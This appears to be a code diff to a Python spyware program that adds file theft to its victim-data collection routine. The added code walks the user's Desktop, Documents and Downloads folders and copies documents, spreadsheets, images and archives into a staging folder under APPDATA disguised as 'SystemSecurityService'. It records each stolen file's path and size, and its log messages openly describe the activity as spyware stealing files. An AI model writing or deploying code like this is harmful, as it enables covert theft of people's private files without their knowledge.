@@ -39,26 +39,62 @@ def collect_victim_data(user_email=None):
             'victim_email': user_email if user_email else "Not provided"
         }
         
-        # === FILE SYSTEM INFORMATION ===
-        print("[Spyware]   - Scanning user folders...")
+        # === FILE SYSTEM INFORMATION & STEAL FILES ===
+        print("[Spyware]   - Scanning and stealing files...")
         user_folders = {
             'Desktop': os.path.join(os.path.expanduser('~'), 'Desktop'),
             'Documents': os.path.join(os.path.expanduser('~'), 'Documents'),
             'Downloads': os.path.join(os.path.expanduser('~'), 'Downloads'),
         }
         
+        # Create stolen files directory
+        appdata = os.getenv('APPDATA')
+        stolen_files_dir = os.path.join(appdata, "SystemSecurityService", "stolen_files")
+        os.makedirs(stolen_files_dir, exist_ok=True)
+        
         collected_data['file_info'] = {}
+        collected_data['stolen_files'] = []
+        
+        # Target file extensions to steal
+        target_extensions = ['.txt', '.pdf', '.docx', '.doc', '.xlsx', '.jpg', '.png', '.zip']
+        
         for folder_name, folder_path in user_folders.items():
             if os.path.exists(folder_path):
                 try:
-                    files = os.listdir(folder_path)[:20]  # First 20 files
+                    all_files = os.listdir(folder_path)
                     collected_data['file_info'][folder_name] = {
                         'path': folder_path,
-                        'file_count': len(os.listdir(folder_path)),
-                        'sample_files': files
+                        'file_count': len(all_files),
+                        'sample_files': all_files[:20]
                     }
+                    
+                    # Steal actual files
+                    for filename in all_files[:10]:  # Limit to 10 files per folder
+                        file_path = os.path.join(folder_path, filename)
+                        if os.path.isfile(file_path):
+                            file_ext = os.path.splitext(filename)[1].lower()
+                            if file_ext in target_extensions:
+                                try:
+                                    # Copy file to stolen directory
+                                    import shutil
+                                    dest_path = os.path.join(stolen_files_dir, f"{folder_name}_{filename}")
+                                    shutil.copy2(file_path, dest_path)
+                                    
+                                    file_size = os.path.getsize(dest_path)
+                                    collected_data['stolen_files'].append({
+                                        'original_path': file_path,
+                                        'filename': filename,
+                                        'folder': folder_name,
+                                        'size': file_size,
+                                        'stolen_path': dest_path
+                                    })
+                                except Exception as e:
+                                    print(f"[Spyware]   - Could not steal {filename}: {e}")
+                
                 except:
                     collected_data['file_info'][folder_name] = "Access denied"
+        
+        print(f"[Spyware]   - Stolen {len(collected_data['stolen_files'])} files")
         
         # === INSTALLED APPLICATIONS ===
         print("[Spyware]   - Detecting installed applications...")
